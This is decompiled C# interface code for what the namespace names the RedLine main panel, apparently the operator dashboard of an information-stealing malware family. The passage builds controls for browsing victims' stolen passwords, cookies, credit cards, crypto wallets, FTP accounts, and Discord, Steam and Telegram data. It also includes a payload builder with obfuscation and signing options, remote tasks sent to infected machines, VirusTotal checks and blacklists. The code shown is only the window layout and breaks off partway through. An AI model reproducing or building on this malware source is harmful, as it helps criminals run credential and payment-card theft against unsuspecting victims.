		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle12 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle13 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle14 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle15 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle16 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle17 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle18 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle19 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle20 = new System.Windows.Forms.DataGridViewCellStyle();
		this.panel1 = new System.Windows.Forms.Panel();
		this.logContextMenu = new System.Windows.Forms.ContextMenuStrip((System.ComponentModel.IContainer)this.object_9);
		this.systemInfoToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.viewersToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.passwordsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.cookiesToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.autofillsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.creditCardsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.fTPToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.filesToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.saveToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.db = new System.Windows.Forms.ToolStripMenuItem();
		this.blockIptoolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.blockHwidtoolStripMenuItem8 = new System.Windows.Forms.ToolStripMenuItem();
		this.showDomainDetects = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem6 = new System.Windows.Forms.ToolStripMenuItem();
		this.ca = new System.Windows.Forms.ToolStripMenuItem();
		this.e0 = new System.Windows.Forms.ContextMenuStrip((System.ComponentModel.IContainer)this.object_9);
		this.e1 = new System.Windows.Forms.ToolStripMenuItem();
		this.d8 = new System.Windows.Forms.ContextMenuStrip((System.ComponentModel.IContainer)this.object_9);
		this.toolStripMenuItem7 = new System.Windows.Forms.ToolStripMenuItem();
		this.d9 = new System.Windows.Forms.ToolStripMenuItem();
		this.blackListCms_2 = new System.Windows.Forms.ContextMenuStrip((System.ComponentModel.IContainer)this.object_9);
		this.deleteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.blackListCms_3 = new System.Windows.Forms.ContextMenuStrip((System.ComponentModel.IContainer)this.object_9);
		this.editToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.topHeader = new System.Windows.Forms.Panel();
		this.lockBtn = (object)new MetroSetButton();
		this.bf = new System.Windows.Forms.Label();
		this.mainTitle = new System.Windows.Forms.Label();
		this.closeBtn = new System.Windows.Forms.Label();
		this.blackListCms_4 = new System.Windows.Forms.ContextMenuStrip((System.ComponentModel.IContainer)this.object_9);
		this.toolStripMenuItem5 = new System.Windows.Forms.ToolStripMenuItem();
		this.blackListCms_5 = new System.Windows.Forms.ContextMenuStrip((System.ComponentModel.IContainer)this.object_9);
		this.toolStripMenuItem4 = new System.Windows.Forms.ToolStripMenuItem();
		this.object_15 = new System.Windows.Forms.NotifyIcon((System.ComponentModel.IContainer)this.object_9);
		this.trayCms = new System.Windows.Forms.ContextMenuStrip((System.ComponentModel.IContainer)this.object_9);
		this.showToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.exitToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.object_16 = (object)new MetroSetToolTip();
		this.blackListCms_6 = new System.Windows.Forms.ContextMenuStrip((System.ComponentModel.IContainer)this.object_9);
		this.toolStripMenuItem8 = new System.Windows.Forms.ToolStripMenuItem();
		this.blackListCms_7 = new System.Windows.Forms.ContextMenuStrip((System.ComponentModel.IContainer)this.object_9);
		this.toolStripMenuItem9 = new System.Windows.Forms.ToolStripMenuItem();
		this.dashboardTabs = new RedLine.MainPanel.Data.UI.AetherTabControl();
		this.logsTab = new System.Windows.Forms.TabPage();
		this.totalSelectedLogs = new System.Windows.Forms.Label();
		this.label50 = new System.Windows.Forms.Label();
		this.totalLogs = new System.Windows.Forms.Label();
		this.label38 = new System.Windows.Forms.Label();
		this.totalPages = new System.Windows.Forms.Label();
		this.totalPagesLbl = new System.Windows.Forms.Label();
		this.currentPage = new System.Windows.Forms.Label();
		this.currentPageLbl = new System.Windows.Forms.Label();
		this.pageNumberTb = (object)new AnimaTextBox();
		this.goToPageBtn = (object)new MetroSetButton();
		this.backPageBtn = (object)new MetroSetButton();
		this.nextPageBtn = (object)new MetroSetButton();
		this.cb = (object)new MetroSetButton();
		this.cc = (object)new AnimaTextBox();
		this.cd = new System.Windows.Forms.Label();
		this.clearBtn = (object)new MetroSetButton();
		this.saveBtn = (object)new MetroSetButton();
		this.setCommentBtn = (object)new MetroSetButton();
		this.commentTb = (object)new AnimaTextBox();
		this.label1 = new System.Windows.Forms.Label();
		this.logsListView = new System.Windows.Forms.DataGridView();
		this.iDDataGridViewTextBoxColumn = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.hWIDDataGridViewTextBoxColumn = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.iPDataGridViewTextBoxColumn = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.buildIDDataGridViewTextBoxColumn = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.usernameDataGridViewTextBoxColumn = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.isProcessElevatedDataGridViewCheckBoxColumn = new System.Windows.Forms.DataGridViewCheckBoxColumn();
		this.currentLanguageDataGridViewTextBoxColumn = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.monitorSizeDataGridViewTextBoxColumn = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.logDateDataGridViewTextBoxColumn = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.uacTypeDataGridViewTextBoxColumn = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.countryDataGridViewTextBoxColumn = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.SeenBefore = new System.Windows.Forms.DataGridViewCheckBoxColumn();
		this.Checked = new System.Windows.Forms.DataGridViewCheckBoxColumn();
		this.locationDataGridViewTextBoxColumn = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.timeZoneDataGridViewTextBoxColumn = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.screenshotDataGridViewImageColumn = new System.Windows.Forms.DataGridViewImageColumn();
		this.Comment = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Creds = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.pDDDataGridViewTextBoxColumn = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.cDDDataGridViewTextBoxColumn = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Credentials = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.object_17 = new System.Windows.Forms.BindingSource((System.ComponentModel.IContainer)this.object_9);
		this.statisticTab = new System.Windows.Forms.TabPage();
		this.metroSetDivider20 = (object)new MetroSetDivider();
		this.activeConnections = new System.Windows.Forms.Label();
		this.metroSetDivider6 = (object)new MetroSetDivider();
		this.metroSetDivider7 = (object)new MetroSetDivider();
		this.metroSetDivider17 = (object)new MetroSetDivider();
		this.metroSetDivider8 = (object)new MetroSetDivider();
		this.metroSetDivider18 = (object)new MetroSetDivider();
		this.top10AvsLb = new System.Windows.Forms.ListBox();
		this.metroSetLabel6 = (object)new MetroSetLabel();
		this.ce = (object)new MetroSetButton();
		this.c4 = new System.Windows.Forms.Label();
		this.c5 = new System.Windows.Forms.Label();
		this.top10CountriesLb = new System.Windows.Forms.ListBox();
		this.top10countryLbl = (object)new MetroSetLabel();
		this.top10osLb = new System.Windows.Forms.ListBox();
		this.top10osLbl = (object)new MetroSetLabel();
		this.ftpLbl = new System.Windows.Forms.Label();
		this.ftpsCounter = new System.Windows.Forms.Label();
		this.filesLbl = new System.Windows.Forms.Label();
		this.filesCounter = new System.Windows.Forms.Label();
		this.metroSetDivider5 = (object)new MetroSetDivider();
		this.cardsLbl = new System.Windows.Forms.Label();
		this.creditcardsCounter = new System.Windows.Forms.Label();
		this.metroSetDivider4 = (object)new MetroSetDivider();
		this.autofillsLbl = new System.Windows.Forms.Label();
		this.autofillsCounter = new System.Windows.Forms.Label();
		this.metroSetDivider3 = (object)new MetroSetDivider();
		this.cookiesLbl = new System.Windows.Forms.Label();
		this.cookiesCounter = new System.Windows.Forms.Label();
		this.metroSetDivider2 = (object)new MetroSetDivider();
		this.passwordsLbl = new System.Windows.Forms.Label();
		this.passwordsCounter = new System.Windows.Forms.Label();
		this.metroSetDivider1 = (object)new MetroSetDivider();
		this.label56 = new System.Windows.Forms.Label();
		this.partnersTab = new System.Windows.Forms.TabPage();
		this.partnerPoster6 = new RedLine.MainPanel.Data.UI.PartnerPoster();
		this.partnerPoster5 = new RedLine.MainPanel.Data.UI.PartnerPoster();
		this.partnerPoster4 = new RedLine.MainPanel.Data.UI.PartnerPoster();
		this.partnerPoster3 = new RedLine.MainPanel.Data.UI.PartnerPoster();
		this.partnerPoster2 = new RedLine.MainPanel.Data.UI.PartnerPoster();
		this.partnerPoster1 = new RedLine.MainPanel.Data.UI.PartnerPoster();
		this.fc = new System.Windows.Forms.TabPage();
		this.changeMd5Cb = (object)new MetroSetCheckBox();
		this.label36 = new System.Windows.Forms.Label();
		this.createDirectFileBtn = new System.Windows.Forms.Button();
		this.guestFilesDgv = new System.Windows.Forms.DataGridView();
		this.iDDataGridViewTextBoxColumn3 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.filenameDataGridViewTextBoxColumn = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.changeMd5DataGridViewCheckBoxColumn = new System.Windows.Forms.DataGridViewCheckBoxColumn();
		this.object_14 = new System.Windows.Forms.BindingSource((System.ComponentModel.IContainer)this.object_9);
		this.metroSetDivider16 = (object)new MetroSetDivider();
		this.guestExpireDate = (object)new AnimaTextBox();
		this.label34 = new System.Windows.Forms.Label();
		this.guestBuildID = (object)new AnimaTextBox();
		this.label33 = new System.Windows.Forms.Label();
		this.addGuest = new System.Windows.Forms.Button();
		this.fd = new System.Windows.Forms.DataGridView();
		this.fe = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.ff = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.expiresTimeDataGridViewTextBoxColumn = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.object_12 = new System.Windows.Forms.BindingSource((System.ComponentModel.IContainer)this.object_9);
		this.tasksTab = new System.Windows.Forms.TabPage();
		this.c0 = (object)new AnimaTextBox();
		this.c1 = (object)new MetroSetLabel();
		this.c2 = (object)new AnimaTextBox();
		this.c3 = (object)new MetroSetLabel();
		this.deleteAllBtn = new System.Windows.Forms.Button();
		this.updateTaskBtn = new System.Windows.Forms.Button();
		this.currentTaskStatus = new System.Windows.Forms.ComboBox();
		this.editTaskFilter = (object)new AnimaTextBox();
		this.editTaskFinal = (object)new AnimaTextBox();
		this.editTaskTarget = (object)new AnimaTextBox();
		this.editTaskAction = new System.Windows.Forms.ComboBox();
		this.newTaskAction = new System.Windows.Forms.ComboBox();
		this.newTaskFilter = (object)new AnimaTextBox();
		this.newTaskFinal = (object)new AnimaTextBox();
		this.newTaskTarget = (object)new AnimaTextBox();
		this.currentTaskStatusLbl = (object)new MetroSetLabel();
		this.editTaskVisible = (object)new MetroSetCheckBox();
		this.editTaskVisibleLbl = (object)new MetroSetLabel();
		this.editTaskFilterLbl = (object)new MetroSetLabel();
		this.newTaskFilterLbl = (object)new MetroSetLabel();
		this.editTaskFinalLbl = (object)new MetroSetLabel();
		this.saveTaskBtn = new System.Windows.Forms.Button();
		this.editTaskTargetLbl = (object)new MetroSetLabel();
		this.editTaskActionLbl = (object)new MetroSetLabel();
		this.metroSetDivider9 = (object)new MetroSetDivider();
		this.newTaskFinalLbl = (object)new MetroSetLabel();
		this.addTaskBtn = new System.Windows.Forms.Button();
		this.newTaskTargetLbl = (object)new MetroSetLabel();
		this.newTaskActionLbl = (object)new MetroSetLabel();
		this.tasksDgv = new System.Windows.Forms.DataGridView();
		this.iDDataGridViewTextBoxColumn1 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.targetDataGridViewTextBoxColumn = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.actionDataGridViewTextBoxColumn = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.finalPointDataGridViewTextBoxColumn = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.currentDataGridViewTextBoxColumn = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.statusDataGridViewTextBoxColumn = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.filterDataGridViewTextBoxColumn = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.visibleDataGridViewCheckBoxColumn = new System.Windows.Forms.DataGridViewCheckBoxColumn();
		this.object_11 = new System.Windows.Forms.BindingSource((System.ComponentModel.IContainer)this.object_9);
		this.sorterTab = new System.Windows.Forms.TabPage();
		this.loadConfigBtn = (object)new MetroSetButton();
		this.saveConfigBtn = (object)new MetroSetButton();
		this.cookiesMoreThan = new System.Windows.Forms.NumericUpDown();
		this.label54 = new System.Windows.Forms.Label();
		this.passMoreThan = new System.Windows.Forms.NumericUpDown();
		this.label55 = new System.Windows.Forms.Label();
		this.saveDiscordTokensBtn = (object)new MetroSetButton();
		this.dataFormatSavingTb = (object)new AnimaTextBox();
		this.label42 = new System.Windows.Forms.Label();
		this.fileNamesToSearchTb = (object)new AnimaTextBox();
		this.label41 = new System.Windows.Forms.Label();
		this.steamFilesCb = (object)new MetroSetCheckBox();
		this.label39 = new System.Windows.Forms.Label();
		this.findTgCb = (object)new MetroSetCheckBox();
		this.label37 = new System.Windows.Forms.Label();
		this.saveFtpAccountsBtn = (object)new MetroSetButton();
		this.removeCheckedLogsBtn = (object)new MetroSetButton();
		this.removeEmptyLogsBtn = (object)new MetroSetButton();
		this.logDateToDTP = new System.Windows.Forms.DateTimePicker();
		this.logDateFromDTP = new System.Windows.Forms.DateTimePicker();
		this.singleSkipCheckedSortCb = (object)new MetroSetCheckBox();
		this.label35 = new System.Windows.Forms.Label();
		this.singleRefreshDomainDetectSortCb = (object)new MetroSetCheckBox();
		this.label32 = new System.Windows.Forms.Label();
		this.f8 = (object)new MetroSetCheckBox();
		this.f9 = new System.Windows.Forms.Label();
		this.fa = (object)new MetroSetCheckBox();
		this.fb = new System.Windows.Forms.Label();
		this.f1 = (object)new MetroSetDivider();
		this.eb = (object)new MetroSetLabel();
		this.ec = (object)new MetroSetLabel();
		this.ed = (object)new MetroSetButton();
		this.ee = (object)new AnimaTextBox();
		this.ef = (object)new MetroSetLabel();
		this.f0 = (object)new MetroSetLabel();
		this.e9 = (object)new AnimaTextBox();
		this.ea = new System.Windows.Forms.Label();
		this.e7 = (object)new AnimaTextBox();
		this.e8 = new System.Windows.Forms.Label();
		this.de = new System.Windows.Forms.Label();
		this.df = new System.Windows.Forms.Label();
		this.c6 = (object)new MetroSetCheckBox();
		this.c7 = new System.Windows.Forms.Label();
		this.m_a2 = (object)new MetroSetLabel();
		this.m_a3 = (object)new MetroSetLabel();
		this.sortDomain = (object)new MetroSetButton();
		this.domainsTb = (object)new AnimaTextBox();
		this.m_a0 = (object)new MetroSetLabel();
		this.m_a1 = (object)new MetroSetLabel();
		this.singleOsSortTb = (object)new AnimaTextBox();
		this.label17 = new System.Windows.Forms.Label();
		this.singleFilesSortCb = (object)new MetroSetCheckBox();
		this.label16 = new System.Windows.Forms.Label();
		this.singleFtpsSortCb = (object)new MetroSetCheckBox();
		this.label15 = new System.Windows.Forms.Label();
		this.singleAfSortCb = (object)new MetroSetCheckBox();
		this.label14 = new System.Windows.Forms.Label();
		this.singleCCsSortCb = (object)new MetroSetCheckBox();
		this.label13 = new System.Windows.Forms.Label();
		this.singleCountrySortTb = (object)new AnimaTextBox();
		this.singleSort = (object)new MetroSetButton();
		this.singleCookieSortTb = (object)new AnimaTextBox();
		this.label12 = new System.Windows.Forms.Label();
		this.metroSetDivider12 = (object)new MetroSetDivider();
		this.singlePasswordSortTb = (object)new AnimaTextBox();
		this.label11 = new System.Windows.Forms.Label();
		this.singleCommentSortTb = (object)new AnimaTextBox();
		this.label10 = new System.Windows.Forms.Label();
		this.singleIdSortTb = (object)new AnimaTextBox();
		this.label9 = new System.Windows.Forms.Label();
		this.label8 = new System.Windows.Forms.Label();
		this.singleStatusLbl = (object)new MetroSetLabel();
		this.metroSetLabel1 = (object)new MetroSetLabel();
		this.dd = new System.Windows.Forms.TabPage();
		this.openWalletBtn = (object)new MetroSetButton();
		this.walletPath = (object)new AnimaTextBox();
		this.label7 = new System.Windows.Forms.Label();
		this.builderTab = new System.Windows.Forms.TabPage();
		this.obfuscateCheckBox = (object)new MetroSetCheckBox();
		this.label59 = new System.Windows.Forms.Label();
		this.sendLogByPartsCb = (object)new MetroSetCheckBox();
		this.label58 = new System.Windows.Forms.Label();
		this.errorMessageTb = (object)new AnimaTextBox();
		this.label46 = new System.Windows.Forms.Label();
		this.proSignButton = (object)new MetroSetButton();
		this.checkConnectionBtn = (object)new MetroSetButton();
		this.m_a4 = (object)new AnimaTextBox();
		this.m_a5 = new System.Windows.Forms.Label();
		this.m_a6 = (object)new AnimaTextBox();
		this.m_a7 = new System.Windows.Forms.Label();
		this.m_a8 = (object)new MetroSetButton();
		this.m_a9 = (object)new MetroSetButton();
		this.m_aa = (object)new AnimaTextBox();
		this.m_ab = new System.Windows.Forms.Label();
		this.m_ac = new System.Windows.Forms.TabPage();
		this.virusTotalTextbox = (object)new AnimaTextBox();
		this.metroSetButton3 = (object)new MetroSetButton();
		this.virusTotalKey = (object)new AnimaTextBox();
		this.label47 = new System.Windows.Forms.Label();
		this.openVirusTotalFile = (object)new MetroSetButton();
		this.virustotalFile = (object)new AnimaTextBox();
		this.label48 = new System.Windows.Forms.Label();
		this.metroSetDivider19 = (object)new MetroSetDivider();
		this.b9 = (object)new MetroSetButton();
		this.ba = (object)new AnimaTextBox();
		this.bb = new System.Windows.Forms.Label();
		this.bc = (object)new MetroSetButton();
		this.bd = (object)new AnimaTextBox();
		this.be = new System.Windows.Forms.Label();
		this.m_ad = (object)new MetroSetButton();
		this.m_ae = (object)new MetroSetCheckBox();
		this.af = new System.Windows.Forms.Label();
		this.b0 = (object)new MetroSetCheckBox();
		this.b1 = new System.Windows.Forms.Label();
		this.b2 = (object)new MetroSetDivider();
		this.b3 = (object)new MetroSetButton();
		this.b4 = (object)new AnimaTextBox();
		this.b5 = new System.Windows.Forms.Label();
		this.b6 = (object)new MetroSetButton();
		this.b7 = (object)new AnimaTextBox();
		this.b8 = new System.Windows.Forms.Label();
		this.f2 = new System.Windows.Forms.TabPage();
		this.autoStartTelegramCb = (object)new MetroSetCheckBox();
		this.label57 = new System.Windows.Forms.Label();
		this.addIdBlackListBtn = (object)new MetroSetButton();
		this.removeIdBlackListBtn = (object)new MetroSetButton();
		this.blackListChatIds = new System.Windows.Forms.ListBox();
		this.label49 = new System.Windows.Forms.Label();
		this.addRecipientIdBtn = (object)new MetroSetButton();
		this.configRecipientIdBtn = (object)new MetroSetButton();
		this.removeRecipientIdBtn = (object)new MetroSetButton();
		this.recipientsIdsListBox = new System.Windows.Forms.ListBox();
		this.label51 = new System.Windows.Forms.Label();
		this.f3 = (object)new MetroSetButton();
		this.f4 = (object)new MetroSetLabel();
		this.f5 = (object)new MetroSetLabel();
		this.f6 = (object)new AnimaTextBox();
		this.f7 = new System.Windows.Forms.Label();
		this.notificationTab = new System.Windows.Forms.TabPage();
		this.notificationTb = new System.Windows.Forms.RichTextBox();
		this.blackListsTab = new System.Windows.Forms.TabPage();
		this.importBuilds = (object)new MetroSetButton();
		this.addBlackBuildBtn = (object)new MetroSetButton();
		this.blackBuildIdTb = (object)new AnimaTextBox();
		this.label52 = new System.Windows.Forms.Label();
		this.blackListBuildsLb = new System.Windows.Forms.ListBox();
		this.label53 = new System.Windows.Forms.Label();
		this.importCountries = (object)new MetroSetButton();
		this.metroSetDivider11 = (object)new MetroSetDivider();
		this.metroSetButton2 = (object)new MetroSetButton();
		this.importHWIDs = (object)new MetroSetButton();
		this.addBlackHwidBtn = (object)new MetroSetButton();
		this.blackHwidTb = (object)new AnimaTextBox();
		this.label43 = new System.Windows.Forms.Label();
		this.blackListHWIDsLb = new System.Windows.Forms.ListBox();
		this.label44 = new System.Windows.Forms.Label();
		this.importIPs = (object)new MetroSetButton();
		this.addBlackIPBtn = (object)new MetroSetButton();
		this.blackIPTb = (object)new AnimaTextBox();
		this.label23 = new System.Windows.Forms.Label();
		this.blackListIPsLb = new System.Windows.Forms.ListBox();
		this.label24 = new System.Windows.Forms.Label();
		this.addBlackCountryBtn = (object)new MetroSetButton();
		this.blackCountryTb = (object)new AnimaTextBox();
		this.blackCountryLbl = new System.Windows.Forms.Label();
		this.blackListLb = new System.Windows.Forms.ListBox();
		this.blackListLbl = new System.Windows.Forms.Label();
		this.settingsTab = new System.Windows.Forms.TabPage();
		this.metroSetButton4 = (object)new MetroSetButton();
		this.label45 = new System.Windows.Forms.Label();
		this.discordCb = (object)new MetroSetCheckBox();
		this.chooseAutosaveDirectory = (object)new MetroSetButton();
		this.autosaveDirTb = (object)new AnimaTextBox();
		this.label40 = new System.Windows.Forms.Label();
		this.screenshotLbl = new System.Windows.Forms.Label();
		this.screenshotCb = (object)new MetroSetCheckBox();
		this.telegramLbl = new System.Windows.Forms.Label();
		this.telegramCb = (object)new MetroSetCheckBox();
		this.steamLbl = new System.Windows.Forms.Label();
		this.steamCb = (object)new MetroSetCheckBox();
		this.vpnLbl = new System.Windows.Forms.Label();
		this.vpnCb = (object)new MetroSetCheckBox();
		this.e2 = new System.Windows.Forms.Label();
		this.e3 = (object)new MetroSetCheckBox();
		this.d4 = (object)new MetroSetButton();
		this.d5 = (object)new MetroSetButton();
		this.d6 = (object)new AnimaTextBox();
		this.d7 = new System.Windows.Forms.Label();
		this.domainDetectorLb = new System.Windows.Forms.ListBox();
		this.da = new System.Windows.Forms.Label();
		this.d3 = (object)new MetroSetButton();
		this.cf = new System.Windows.Forms.Label();
		this.d0 = (object)new MetroSetCheckBox();
		this.c8 = new System.Windows.Forms.Label();
		this.c9 = (object)new MetroSetCheckBox();
		this.duplicateLbl = new System.Windows.Forms.Label();
		this.duplicateCb = (object)new MetroSetCheckBox();
		this.metroSetDivider10 = (object)new MetroSetDivider();
		this.saveSettingsBtn = (object)new MetroSetButton();
		this.addSearchPatternBtn = (object)new MetroSetButton();
		this.searchPatternTb = (object)new AnimaTextBox();
		this.searchPatternLbl = new System.Windows.Forms.Label();
		this.getFilesSettingsLb = new System.Windows.Forms.ListBox();
		this.getFilesSettingsLbl = new System.Windows.Forms.Label();
		this.grabFilesLbl = new System.Windows.Forms.Label();
		this.grabFilesCb = (object)new MetroSetCheckBox();
		this.grabImClientsLbl = new System.Windows.Forms.Label();
		this.grabImClientsCb = (object)new MetroSetCheckBox();
		this.grabFtpsLbl = new System.Windows.Forms.Label();
		this.grabFtpsCb = (object)new MetroSetCheckBox();
		this.grabBrowsersLbl = new System.Windows.Forms.Label();
		this.grabBrowsersCb = (object)new MetroSetCheckBox();
		this.contactsTab = new System.Windows.Forms.TabPage();
		this.e4 = new System.Windows.Forms.Label();
		this.e5 = new System.Windows.Forms.PictureBox();
		this.e6 = (object)new MetroSetButton();
		this.label2 = new System.Windows.Forms.Label();
		this.pictureBox1 = new System.Windows.Forms.PictureBox();
		this.telegramLinkBtn = (object)new MetroSetButton();
		this.d2 = new System.Windows.Forms.BindingSource((System.ComponentModel.IContainer)this.object_9);
		this.object_13 = new System.Windows.Forms.BindingSource((System.ComponentModel.IContainer)this.object_9);
		this.object_10 = new System.Windows.Forms.BindingSource((System.ComponentModel.IContainer)this.object_9);
		this.d1 = new System.Windows.Forms.BindingSource((System.ComponentModel.IContainer)this.object_9);
		this.restoreTab = new System.Windows.Forms.TabPage();
		this.label29 = new System.Windows.Forms.Label();
		this.freshCookiesTb = (object)new AnimaTextBox();
		this.refreshCookiesBtn = (object)new MetroSetButton();
		this.accessTokenTb = (object)new AnimaTextBox();
		this.refreshCookiesLbl = new System.Windows.Forms.Label();
		((System.Windows.Forms.Control)this.logContextMenu).SuspendLayout();
		((System.Windows.Forms.Control)this.e0).SuspendLayout();
		((System.Windows.Forms.Control)this.d8).SuspendLayout();
		((System.Windows.Forms.Control)this.blackListCms_2).SuspendLayout();
		((System.Windows.Forms.Control)this.blackListCms_3).SuspendLayout();
		((System.Windows.Forms.Control)this.topHeader).SuspendLayout();
		((System.Windows.Forms.Control)this.blackListCms_4).SuspendLayout();
		((System.Windows.Forms.Control)this.blackListCms_5).SuspendLayout();
		((System.Windows.Forms.Control)this.trayCms).SuspendLayout();
		((System.Windows.Forms.Control)this.blackListCms_6).SuspendLayout();
		((System.Windows.Forms.Control)this.blackListCms_7).SuspendLayout();
		((System.Windows.Forms.Control)this.dashboardTabs).SuspendLayout();
		((System.Windows.Forms.Control)this.logsTab).SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.logsListView).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.object_17).BeginInit();
		((System.Windows.Forms.Control)this.statisticTab).SuspendLayout();
		((System.Windows.Forms.Control)this.partnersTab).SuspendLayout();
		((System.Windows.Forms.Control)this.fc).SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.guestFilesDgv).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.object_14).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.fd).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.object_12).BeginInit();
		((System.Windows.Forms.Control)this.tasksTab).SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.tasksDgv).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.object_11).BeginInit();
		((System.Windows.Forms.Control)this.sorterTab).SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.cookiesMoreThan).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.passMoreThan).BeginInit();
		((System.Windows.Forms.Control)this.dd).SuspendLayout();
		((System.Windows.Forms.Control)this.builderTab).SuspendLayout();
		((System.Windows.Forms.Control)this.m_ac).SuspendLayout();
		((System.Windows.Forms.Control)this.f2).SuspendLayout();
		((System.Windows.Forms.Control)this.notificationTab).SuspendLayout();
		((System.Windows.Forms.Control)this.blackListsTab).SuspendLayout();
		((System.Windows.Forms.Control)this.settingsTab).SuspendLayout();
		((System.Windows.Forms.Control)this.contactsTab).SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.e5).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.pictureBox1).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.d2).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.object_13).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.object_10).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.d1).BeginInit();
		((System.Windows.Forms.Control)this.restoreTab).SuspendLayout();
		base.SuspendLayout();
		((System.Windows.Forms.Control)this.panel1).Dock = System.Windows.Forms.DockStyle.Bottom;
		((System.Windows.Forms.Control)this.panel1).Location = new System.Drawing.Point(0, 52);
		((System.Windows.Forms.Control)this.panel1).Name = "panel1";
		((System.Windows.Forms.Control)this.panel1).Size = new System.Drawing.Size(1366, 622);
		((System.Windows.Forms.Control)this.panel1).TabIndex = 0;
		((System.Windows.Forms.ToolStrip)this.logContextMenu).Items.AddRange(new System.Windows.Forms.ToolStripItem[9]
		{
			(System.Windows.Forms.ToolStripItem)this.systemInfoToolStripMenuItem,
			(System.Windows.Forms.ToolStripItem)this.viewersToolStripMenuItem,
			(System.Windows.Forms.ToolStripItem)this.saveToolStripMenuItem,
			(System.Windows.Forms.ToolStripItem)this.db,
			(System.Windows.Forms.ToolStripItem)this.blockIptoolStripMenuItem,
			(System.Windows.Forms.ToolStripItem)this.blockHwidtoolStripMenuItem8,
			(System.Windows.Forms.ToolStripItem)this.showDomainDetects,
			(System.Windows.Forms.ToolStripItem)this.toolStripMenuItem6,
			(System.Windows.Forms.ToolStripItem)this.ca
		});
		((System.Windows.Forms.Control)this.logContextMenu).Name = "logContextMenu";
		((System.Windows.Forms.Control)this.logContextMenu).Size = new System.Drawing.Size(191, 202);
		((System.Windows.Forms.ToolStripDropDown)this.logContextMenu).Opening += new System.ComponentModel.CancelEventHandler(logContextMenu_Opening);
		((System.Windows.Forms.ToolStripItem)this.systemInfoToolStripMenuItem).Name = "systemInfoToolStripMenuItem";
		((System.Windows.Forms.ToolStripItem)this.systemInfoToolStripMenuItem).Size = new System.Drawing.Size(190, 22);
		((System.Windows.Forms.ToolStripItem)this.systemInfoToolStripMenuItem).Text = "System Info";
		((System.Windows.Forms.ToolStripItem)this.systemInfoToolStripMenuItem).Click += new System.EventHandler(systemInfoToolStripMenuItem_Click);
